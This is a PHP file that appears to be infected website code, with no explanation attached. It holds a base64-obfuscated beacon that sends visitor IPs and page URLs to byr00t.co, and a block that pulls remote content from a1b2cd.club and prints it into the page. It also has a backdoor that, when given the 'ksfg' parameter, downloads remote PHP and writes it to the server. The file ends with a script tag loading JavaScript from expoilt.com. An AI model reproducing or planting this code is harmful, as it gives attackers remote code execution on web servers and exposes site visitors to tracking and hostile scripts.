<?php
function GetIP(){
    if(getenv("HTTP_CLIENT_IP")) {
        $ip = getenv("HTTP_CLIENT_IP");
    } elseif(getenv("HTTP_X_FORWARDED_FOR")) {
        $ip = getenv("HTTP_X_FORWARDED_FOR");
        if (strstr($ip, ',')) {
            $tmp = explode (',', $ip);
            $ip = trim($tmp[0]);
        }
    } else {
        $ip = getenv("REMOTE_ADDR");
    }
    return $ip;
}
$x = base64_decode('aHR0cDovL2J5cjAwdC5jby9sLQ==').GetIP().'-'.base64_encode('http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
if(function_exists('curl_init'))
{
    $ch = @curl_init(); curl_setopt($ch, CURLOPT_URL, $x); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $gitt = curl_exec($ch); curl_close($ch);
    if($gitt == false){
        @$gitt = file_get_contents($x);
    }
}elseif(function_exists('file_get_contents')){
    @$gitt = file_get_contents($x);
}
?><?php
error_reporting(0);
$s='http://a1b2cd.club/';
$host = str_replace('www.', '', @$_SERVER['HTTP_HOST']);
$x = $s.'l-'.base64_encode($host);

if(function_exists('curl_init'))
{
$ch = @curl_init(); curl_setopt($ch, CURLOPT_URL, $x); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $gitt = curl_exec($ch); curl_close($ch);
if($gitt == false){
    @$gitt = file_get_contents($x);
}
}elseif(function_exists('file_get_contents')){
    @$gitt = file_get_contents($x);
}
echo $gitt;

if(isset($_GET['ksfg'])){
    $f=fopen($_GET['ksfg'].'.php','a');
    fwrite($f,file_get_contents($s.'s-'.$_GET['ksfg']));
    fclose($f);
}
echo '<!DOCTYPE html!>';
?>
</marquee><script src=http://expoilt.com/ccb.js></script>